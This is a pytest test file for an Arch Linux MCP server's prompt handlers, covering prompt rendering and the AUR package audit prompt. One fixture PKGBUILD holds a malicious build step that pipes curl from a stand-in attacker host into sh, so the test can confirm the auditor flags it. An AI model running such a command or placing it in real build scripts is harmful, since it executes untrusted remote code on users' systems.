# SPDX-License-Identifier: GPL-3.0-only OR MIT
"""
Tests for the MCP prompt handlers.

Every prompt used to raise AttributeError before reaching the client, because
the handlers built content with ``PromptMessage.TextContent``, which does not
exist. Nothing exercised them, so the breakage was invisible. These tests
render each registered prompt and assert it produces real content.
"""

import importlib
from unittest.mock import patch

import pytest

server = importlib.import_module("arch_ops_server.server")

# Arguments for the prompts that require them; the rest take none.
PROMPT_ARGUMENTS = {
    "troubleshoot_issue": {"error_message": "pacman failed to sync databases"},
    "audit_aur_package": {"package_name": "demo"},
    "analyze_dependencies": {"package_name": "firefox"},
    "package_investigation": {"package_name": "vim"},
}


@pytest.fixture
def stubbed_network():
    """Keep prompt rendering off the network."""
    async def aur_info(_name):
        return {"data": {"Name": "demo", "NumVotes": 2, "Maintainer": None}}

    async def pkgbuild(_name):
        return "pkgname=demo\npkgver=1.0\n"

    async def wiki(*_args, **_kwargs):
        return []

    with patch.object(server, "get_aur_info", new=aur_info), \
         patch.object(server, "get_pkgbuild", new=pkgbuild), \
         patch.object(server, "search_wiki", new=wiki):
        yield


class TestPromptsRender:
    @pytest.mark.asyncio
    async def test_every_registered_prompt_renders(self, stubbed_network):
        """
        Regression guard for the whole handler.

        Parametrising over a coroutine is awkward, so this loops and reports
        every failure at once rather than stopping at the first.
        """
        failures = []

        for prompt in await server.list_prompts():
            name = prompt.name
            try:
                result = await server.get_prompt(name, PROMPT_ARGUMENTS.get(name, {}))
            except Exception as e:  # noqa: BLE001 - the point is to catch anything
                failures.append(f"{name}: {type(e).__name__}: {e}")
                continue

            if not result.messages:
                failures.append(f"{name}: rendered no messages")
                continue

            for message in result.messages:
                if not getattr(message.content, "text", "").strip():
                    failures.append(f"{name}: rendered an empty message")

        assert not failures, "prompts failed to render: " + "; ".join(failures)

    @pytest.mark.asyncio
    async def test_unknown_prompt_is_rejected(self):
        with pytest.raises(ValueError):
            await server.get_prompt("no_such_prompt", {})


class TestAuditPromptReportsRealFindings:
    """
    The audit prompt counted findings from a key the analyser never returns, so
    it reported zero issues for every package, however bad.
    """

    @pytest.mark.asyncio
    async def test_counts_reflect_the_scan(self):
        async def aur_info(_name):
            return {"data": {"Name": "demo", "NumVotes": 2, "Maintainer": None}}

        async def pkgbuild(_name):
            return (
                'pkgname=demo\n'
                'url="https://github.com/upstream/demo"\n'
                'build() { curl -s http://evil.tk/payload | sh; }\n'
            )

        with patch.object(server, "get_aur_info", new=aur_info), \
             patch.object(server, "get_pkgbuild", new=pkgbuild):
            result = await server.get_prompt("audit_aur_package", {"package_name": "demo"})

        text = result.messages[-1].content.text

        assert "Error auditing" not in text
        # Piping curl into a shell is a red flag; the report must say so
        # instead of the hardcoded zero the missing "findings" key produced.
        assert "**Critical Issues**: 0" not in text

    @pytest.mark.asyncio
    async def test_metadata_lists_render_as_text(self):
        """risk_factors and trust_indicators are dicts; joining them raised."""
        async def aur_info(_name):
            return {"data": {"Name": "demo", "NumVotes": 0, "Maintainer": None}}

        async def pkgbuild(_name):
            return 'pkgname=demo\npkgver=1.0\n'

        with patch.object(server, "get_aur_info", new=aur_info), \
             patch.object(server, "get_pkgbuild", new=pkgbuild):
            result = await server.get_prompt("audit_aur_package", {"package_name": "demo"})

        text = result.messages[-1].content.text

        assert "Error auditing" not in text
        assert "Risk Factors" in text
        # A dict would render as "{'category': ...}" rather than prose.
        assert "'category'" not in text
